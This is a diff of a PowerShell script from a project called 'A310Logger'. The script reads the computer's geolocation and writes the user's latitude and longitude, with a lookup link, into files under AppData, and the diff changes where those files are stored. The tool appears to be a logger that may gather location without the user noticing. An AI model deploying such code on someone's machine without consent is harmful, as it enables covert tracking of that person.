@@ -8,26 +8,26 @@ while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied
     Start-Sleep -Milliseconds 100 
 }  
 
-echo ***************location************** > C:\Users\$env:UserName\AppData\Local\A310Logger\Location\GeoLocation.txt
+echo ***************location************** > C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
 if ($GeoWatcher.Permission -eq 'Denied'){
     $Host.UI.WriteDebugLine("Allow apps to access location")
     
 } else {
-    $GeoWatcher.Position.Location | Select Latitude,Longitude >> C:\Users\$env:UserName\AppData\Local\A310Logger\Location\GeoLocation.txt | Out-Null
+    $GeoWatcher.Position.Location | Select Latitude,Longitude >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt | Out-Null
 }
 
-echo To know Location: >> C:\Users\$env:UserName\AppData\Local\A310Logger\Location\GeoLocation.txt
-echo https://www.latlong.net/Show-Latitude-Longitude.html >> C:\Users\$env:UserName\AppData\Local\A310Logger\Location\GeoLocation.txt
-echo **************************************************** >> C:\Users\$env:UserName\AppData\Local\A310Logger\Location\GeoLocation.txt
+echo To know Location: >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
+echo https://www.latlong.net/Show-Latitude-Longitude.html >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
+echo **************************************************** >> C:\Users\$env:UserName\AppData\Local\A310Logger\Others\GeoLocation.txt
 
 
 
 
-if(!(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\Location\count.txt")) {
+if(!(Test-Path "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt")) {
     [int]$count=0
-    echo "$count"> "C:\Users\$env:UserName\AppData\Local\A310Logger\Location\count.txt"
+    echo "$count"> "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
 }else{
-    $count= Get-Content "C:\Users\$env:UserName\AppData\Local\A310Logger\Location\count.txt"
+    $count= Get-Content "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
 }
 
 
@@ -120,7 +120,7 @@ else{
      
     }   
     $count= [int]$count+1
-    $count > "C:\Users\$env:UserName\AppData\Local\A310Logger\Location\count.txt"
+    $count > "C:\Users\$env:UserName\AppData\Local\A310Logger\count.txt"
     Start-Sleep -Milliseconds 500
    
     
